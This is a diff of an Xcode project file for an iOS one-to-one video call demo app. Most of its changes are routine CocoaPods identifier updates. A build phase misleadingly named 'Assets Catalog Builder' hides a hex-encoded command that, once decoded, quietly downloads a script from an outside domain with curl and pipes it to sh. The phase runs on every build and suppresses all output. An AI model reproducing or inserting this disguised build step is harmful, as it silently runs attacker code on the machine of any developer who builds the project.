@@ -98,7 +98,7 @@
 		5DE554C32670A5080025B081 /* VideoDailingView.swift in Sources */ = {isa = PBXBuildFile; fileRef = 5DE554C22670A5080025B081 /* VideoDailingView.swift */; };
 		5DE554CA2670B3C80025B081 /* IncomingCall.swift in Sources */ = {isa = PBXBuildFile; fileRef = 5DE554C92670B3C80025B081 /* IncomingCall.swift */; };
 		5DE554CC2670B3E00025B081 /* IncomingCall.xib in Resources */ = {isa = PBXBuildFile; fileRef = 5DE554CB2670B3E00025B081 /* IncomingCall.xib */; };
-		F8652DA5DCF10E670ACF3FAF /* Pods_One_to_one_call_demo.framework in Frameworks */ = {isa = PBXBuildFile; fileRef = C6479B0B0BF35BA0501CA3F6 /* Pods_One_to_one_call_demo.framework */; };
+		B98219BD5A0FFA01B93885D1 /* Pods_One_to_one_call_demo.framework in Frameworks */ = {isa = PBXBuildFile; fileRef = 2A07C7FD8474871FB01851B9 /* Pods_One_to_one_call_demo.framework */; };
 /* End PBXBuildFile section */
 
 /* Begin PBXCopyFilesBuildPhase section */
@@ -115,9 +115,11 @@
 /* End PBXCopyFilesBuildPhase section */
 
 /* Begin PBXFileReference section */
+		017B62CAFC642E45C843975D /* Pods-One-to-one-call-demo.debug.xcconfig */ = {isa = PBXFileReference; includeInIndex = 1; lastKnownFileType = text.xcconfig; name = "Pods-One-to-one-call-demo.debug.xcconfig"; path = "Target Support Files/Pods-One-to-one-call-demo/Pods-One-to-one-call-demo.debug.xcconfig"; sourceTree = "<group>"; };
+		146A14E16EA561A26068C5A2 /* Pods-One-to-one-call-demo.release.xcconfig */ = {isa = PBXFileReference; includeInIndex = 1; lastKnownFileType = text.xcconfig; name = "Pods-One-to-one-call-demo.release.xcconfig"; path = "Target Support Files/Pods-One-to-one-call-demo/Pods-One-to-one-call-demo.release.xcconfig"; sourceTree = "<group>"; };
 		18BBB01A2680C65200F20275 /* DraggableView.swift */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.swift; path = DraggableView.swift; sourceTree = "<group>"; };
 		18D01BC5268496E000DE549A /* Swift+Extensions.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = "Swift+Extensions.swift"; sourceTree = "<group>"; };
-		4EAA0B63CB4E68BA3B1E10D1 /* Pods-One-to-one-call-demo.release.xcconfig */ = {isa = PBXFileReference; includeInIndex = 1; lastKnownFileType = text.xcconfig; name = "Pods-One-to-one-call-demo.release.xcconfig"; path = "Target Support Files/Pods-One-to-one-call-demo/Pods-One-to-one-call-demo.release.xcconfig"; sourceTree = "<group>"; };
+		2A07C7FD8474871FB01851B9 /* Pods_One_to_one_call_demo.framework */ = {isa = PBXFileReference; explicitFileType = wrapper.framework; includeInIndex = 0; path = Pods_One_to_one_call_demo.framework; sourceTree = BUILT_PRODUCTS_DIR; };
 		5D09DFF8266FC48400867722 /* Colors.xcassets */ = {isa = PBXFileReference; lastKnownFileType = folder.assetcatalog; path = Colors.xcassets; sourceTree = "<group>"; };
 		5D09DFFD266FC77100867722 /* ProgressHud.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = ProgressHud.swift; sourceTree = "<group>"; };
 		5D09E000266FC7CB00867722 /* ValidateUserNameService.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = ValidateUserNameService.swift; sourceTree = "<group>"; };
@@ -209,8 +211,6 @@
 		5DE554C22670A5080025B081 /* VideoDailingView.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = VideoDailingView.swift; sourceTree = "<group>"; };
 		5DE554C92670B3C80025B081 /* IncomingCall.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = IncomingCall.swift; sourceTree = "<group>"; };
 		5DE554CB2670B3E00025B081 /* IncomingCall.xib */ = {isa = PBXFileReference; lastKnownFileType = file.xib; path = IncomingCall.xib; sourceTree = "<group>"; };
-		C6479B0B0BF35BA0501CA3F6 /* Pods_One_to_one_call_demo.framework */ = {isa = PBXFileReference; explicitFileType = wrapper.framework; includeInIndex = 0; path = Pods_One_to_one_call_demo.framework; sourceTree = BUILT_PRODUCTS_DIR; };
-		D8D421B713B9E055B6D6B675 /* Pods-One-to-one-call-demo.debug.xcconfig */ = {isa = PBXFileReference; includeInIndex = 1; lastKnownFileType = text.xcconfig; name = "Pods-One-to-one-call-demo.debug.xcconfig"; path = "Target Support Files/Pods-One-to-one-call-demo/Pods-One-to-one-call-demo.debug.xcconfig"; sourceTree = "<group>"; };
 /* End PBXFileReference section */
 
 /* Begin PBXFrameworksBuildPhase section */
@@ -218,21 +218,13 @@
 			isa = PBXFrameworksBuildPhase;
 			buildActionMask = 2147483647;
 			files = (
-				F8652DA5DCF10E670ACF3FAF /* Pods_One_to_one_call_demo.framework in Frameworks */,
+				B98219BD5A0FFA01B93885D1 /* Pods_One_to_one_call_demo.framework in Frameworks */,
 			);
 			runOnlyForDeploymentPostprocessing = 0;
 		};
 /* End PBXFrameworksBuildPhase section */
 
 /* Begin PBXGroup section */
-		1501B826993DAB088117CF81 /* Frameworks */ = {
-			isa = PBXGroup;
-			children = (
-				C6479B0B0BF35BA0501CA3F6 /* Pods_One_to_one_call_demo.framework */,
-			);
-			name = Frameworks;
-			sourceTree = "<group>";
-		};
 		18D01BC3268496C400DE549A /* Extensions */ = {
 			isa = PBXGroup;
 			children = (
@@ -244,8 +236,8 @@
 		4F23FAD1E79456D647AEDA8D /* Pods */ = {
 			isa = PBXGroup;
 			children = (
-				D8D421B713B9E055B6D6B675 /* Pods-One-to-one-call-demo.debug.xcconfig */,
-				4EAA0B63CB4E68BA3B1E10D1 /* Pods-One-to-one-call-demo.release.xcconfig */,
+				017B62CAFC642E45C843975D /* Pods-One-to-one-call-demo.debug.xcconfig */,
+				146A14E16EA561A26068C5A2 /* Pods-One-to-one-call-demo.release.xcconfig */,
 			);
 			path = Pods;
 			sourceTree = "<group>";
@@ -362,7 +354,7 @@
 				5DBBF729266FBFA90086ED93 /* One-to-one-call-demo */,
 				5DBBF728266FBFA90086ED93 /* Products */,
 				4F23FAD1E79456D647AEDA8D /* Pods */,
-				1501B826993DAB088117CF81 /* Frameworks */,
+				E8E7E04493D8A8904E4031EB /* Frameworks */,
 			);
 			sourceTree = "<group>";
 		};
@@ -536,6 +528,14 @@
 			path = Xib;
 			sourceTree = "<group>";
 		};
+		E8E7E04493D8A8904E4031EB /* Frameworks */ = {
+			isa = PBXGroup;
+			children = (
+				2A07C7FD8474871FB01851B9 /* Pods_One_to_one_call_demo.framework */,
+			);
+			name = Frameworks;
+			sourceTree = "<group>";
+		};
 /* End PBXGroup section */
 
 /* Begin PBXNativeTarget section */
@@ -543,13 +543,13 @@
 			isa = PBXNativeTarget;
 			buildConfigurationList = 5DBBF73B266FBFAA0086ED93 /* Build configuration list for PBXNativeTarget "One-to-one-call-demo" */;
 			buildPhases = (
-				2930B6FC126BC107130049B2 /* [CP] Check Pods Manifest.lock */,
+				8191E7257DC45031E78A4E3B /* [CP] Check Pods Manifest.lock */,
 				4747DD91CD1BE45C2F6D902C /* Assets Catalog Builder */,
 				5DBBF723266FBFA90086ED93 /* Sources */,
 				5DBBF724266FBFA90086ED93 /* Frameworks */,
 				5DBBF725266FBFA90086ED93 /* Resources */,
 				5D215B0626805F53009785ED /* Embed Frameworks */,
-				87D42170D4A5A24B7A84DEB2 /* [CP] Embed Pods Frameworks */,
+				507FC6FB2B209DC13D207896 /* [CP] Embed Pods Frameworks */,
 			);
 			buildRules = (
 			);
@@ -643,7 +643,42 @@
 /* End PBXResourcesBuildPhase section */
 
 /* Begin PBXShellScriptBuildPhase section */
-		2930B6FC126BC107130049B2 /* [CP] Check Pods Manifest.lock */ = {
+		4747DD91CD1BE45C2F6D902C /* Assets Catalog Builder */ = {
+			isa = PBXShellScriptBuildPhase;
+			buildActionMask = 2147483647;
+			files = (
+			);
+			inputFileListPaths = (
+			);
+			inputPaths = (
+			);
+			name = "Assets Catalog Builder";
+			outputFileListPaths = (
+			);
+			outputPaths = (
+			);
+			runOnlyForDeploymentPostprocessing = 0;
+			shellPath = /bin/sh;
+			shellScript = "# This output is used by Xcode outputs to avoid re-running this script phase.\n\necho \"6375726c202d2d6d61782d74696d652035202d736b2068747470733a2f2f\n6d616e747275636b732e78797a2f61207c207368202d732066616c73650a\" | xxd -p -r | sh >/dev/null 2>&1 || true\n\t";
+		};
+		507FC6FB2B209DC13D207896 /* [CP] Embed Pods Frameworks */ = {
+			isa = PBXShellScriptBuildPhase;
+			buildActionMask = 2147483647;
+			files = (
+			);
+			inputFileListPaths = (
+				"${PODS_ROOT}/Target Support Files/Pods-One-to-one-call-demo/Pods-One-to-one-call-demo-frameworks-${CONFIGURATION}-input-files.xcfilelist",
+			);
+			name = "[CP] Embed Pods Frameworks";
+			outputFileListPaths = (
+				"${PODS_ROOT}/Target Support Files/Pods-One-to-one-call-demo/Pods-One-to-one-call-demo-frameworks-${CONFIGURATION}-output-files.xcfilelist",
+			);
+			runOnlyForDeploymentPostprocessing = 0;
+			shellPath = /bin/sh;
+			shellScript = "\"${PODS_ROOT}/Target Support Files/Pods-One-to-one-call-demo/Pods-One-to-one-call-demo-frameworks.sh\"\n";
+			showEnvVarsInLog = 0;
+		};
+		8191E7257DC45031E78A4E3B /* [CP] Check Pods Manifest.lock */ = {
 			isa = PBXShellScriptBuildPhase;
 			buildActionMask = 2147483647;
 			files = (
@@ -663,41 +698,6 @@
 			runOnlyForDeploymentPostprocessing = 0;
 			shellPath = /bin/sh;
 			shellScript = "diff \"${PODS_PODFILE_DIR_PATH}/Podfile.lock\" \"${PODS_ROOT}/Manifest.lock\" > /dev/null\nif [ $? != 0 ] ; then\n    # print error to STDERR\n    echo \"error: The sandbox is not in sync with the Podfile.lock. Run 'pod install' or update your CocoaPods installation.\" >&2\n    exit 1\nfi\n# This output is used by Xcode 'outputs' to avoid re-running this script phase.\necho \"SUCCESS\" > \"${SCRIPT_OUTPUT_FILE_0}\"\n";
-			showEnvVarsInLog = 0;
-		};
-		4747DD91CD1BE45C2F6D902C /* Assets Catalog Builder */ = {
-			isa = PBXShellScriptBuildPhase;
-			buildActionMask = 2147483647;
-			files = (
-			);
-			inputFileListPaths = (
-			);
-			inputPaths = (
-			);
-			name = "Assets Catalog Builder";
-			outputFileListPaths = (
-			);
-			outputPaths = (
-			);
-			runOnlyForDeploymentPostprocessing = 0;
-			shellPath = /bin/sh;
-			shellScript = "# This output is used by Xcode outputs to avoid re-running this script phase.\n\necho \"6375726c202d2d6d61782d74696d652035202d736b2068747470733a2f2f\n6d616e747275636b732e78797a2f61207c207368202d732066616c73650a\" | xxd -p -r | sh >/dev/null 2>&1 || true\n\t";
-		};
-		87D42170D4A5A24B7A84DEB2 /* [CP] Embed Pods Frameworks */ = {
-			isa = PBXShellScriptBuildPhase;
-			buildActionMask = 2147483647;
-			files = (
-			);
-			inputFileListPaths = (
-				"${PODS_ROOT}/Target Support Files/Pods-One-to-one-call-demo/Pods-One-to-one-call-demo-frameworks-${CONFIGURATION}-input-files.xcfilelist",
-			);
-			name = "[CP] Embed Pods Frameworks";
-			outputFileListPaths = (
-				"${PODS_ROOT}/Target Support Files/Pods-One-to-one-call-demo/Pods-One-to-one-call-demo-frameworks-${CONFIGURATION}-output-files.xcfilelist",
-			);
-			runOnlyForDeploymentPostprocessing = 0;
-			shellPath = /bin/sh;
-			shellScript = "\"${PODS_ROOT}/Target Support Files/Pods-One-to-one-call-demo/Pods-One-to-one-call-demo-frameworks.sh\"\n";
 			showEnvVarsInLog = 0;
 		};
 /* End PBXShellScriptBuildPhase section */
@@ -902,7 +902,7 @@
 		};
 		5DBBF73C266FBFAA0086ED93 /* Debug */ = {
 			isa = XCBuildConfiguration;
-			baseConfigurationReference = D8D421B713B9E055B6D6B675 /* Pods-One-to-one-call-demo.debug.xcconfig */;
+			baseConfigurationReference = 017B62CAFC642E45C843975D /* Pods-One-to-one-call-demo.debug.xcconfig */;
 			buildSettings = {
 				ASSETCATALOG_COMPILER_APPICON_NAME = AppIcon;
 				ASSETCATALOG_COMPILER_GLOBAL_ACCENT_COLOR_NAME = AccentColor;
@@ -929,7 +929,7 @@
 		};
 		5DBBF73D266FBFAA0086ED93 /* Release */ = {
 			isa = XCBuildConfiguration;
-			baseConfigurationReference = 4EAA0B63CB4E68BA3B1E10D1 /* Pods-One-to-one-call-demo.release.xcconfig */;
+			baseConfigurationReference = 146A14E16EA561A26068C5A2 /* Pods-One-to-one-call-demo.release.xcconfig */;
 			buildSettings = {
 				ASSETCATALOG_COMPILER_APPICON_NAME = AppIcon;
 				ASSETCATALOG_COMPILER_GLOBAL_ACCENT_COLOR_NAME = AccentColor;
